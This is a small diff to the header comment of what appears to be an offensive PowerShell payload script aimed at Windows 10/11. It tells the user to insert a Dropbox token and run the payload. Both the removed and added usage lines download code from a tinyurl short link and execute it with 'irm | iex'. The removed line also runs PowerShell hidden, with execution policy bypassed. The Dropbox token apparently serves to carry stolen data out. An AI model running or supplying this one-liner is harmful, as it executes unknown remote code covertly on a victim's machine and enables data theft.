@@ -20,7 +20,7 @@
 # Target: Windows 10/11
 # Version: 1.0
 # How-To: update $db = 'INSERT-YOUR-DROPBOX-TOKEN' then run the payload in powershell
-# payload: powershell -w H -NonI -NoP -Ep Bypass $db = 'INSERT-YOUR-DROPBOX-TOKEN';irm tinyurl.com/yw4b5jhm | iex
+# payload: $db = 'INSERT-YOUR-DROPBOX-TOKEN';irm tinyurl.com/yw4b5jhm | iex
 # 
 #------------------------------------------------------------------------------------------------------------------------------------
 #
